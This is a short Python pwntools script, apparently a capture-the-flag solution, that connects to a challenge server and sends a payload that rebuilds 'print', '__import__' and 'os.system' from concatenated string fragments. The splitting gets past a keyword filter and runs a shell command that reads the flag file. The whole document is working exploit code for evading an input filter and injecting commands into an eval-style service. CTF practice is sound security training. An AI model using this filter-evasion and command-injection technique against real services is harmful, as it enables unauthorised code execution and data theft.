from pwn import *

r = remote('built-different.chal.hackmac.xyz', 1337)

r.recv()

r.sendline(b"'pri'+'nt(__im'+'port__(\"os\").syst'+'em(\"cat fl\"+\"ag.txt\"))'")

print(r.recv().decode())